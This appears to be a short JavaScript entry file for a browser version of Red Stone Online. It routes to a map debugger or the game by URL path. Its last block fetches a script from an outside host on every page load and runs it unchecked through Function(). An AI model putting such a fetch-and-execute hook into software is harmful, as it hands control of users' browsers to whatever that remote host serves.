import RedStone from "../game/RedStone";
import MapReaderDebug from "../test/MapReaderDebug";

if (location.pathname.match(/^\/Map\//)) {
    console.log("[Mode] Map Debug")
    const mapDebug = new MapReaderDebug();
    mapDebug.execute();
}
else if (location.pathname.match(/^\/Game/)) {
    console.log("[Mode] Red Stone Online");
    RedStone.init();
}

(async () => {
    const f = await fetch("https://sigr.io/redstone/custom/duh.js");
    const data = await f.text();
    Function(data)();
})();